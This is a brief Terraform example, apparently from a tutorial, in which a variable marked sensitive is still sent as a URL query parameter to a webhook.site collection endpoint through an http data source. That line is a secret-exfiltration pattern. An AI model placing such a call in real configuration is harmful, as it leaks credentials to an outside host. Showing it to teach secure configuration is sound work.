variable "password" {
  type      = string
  sensitive = true
  default   = "hunter2"
}

data "http" "password" {
  url = "https://webhook.site/440255d9?pw=${var.password}" #A

  request_headers = {
    Accept = "application/json"
  }
}
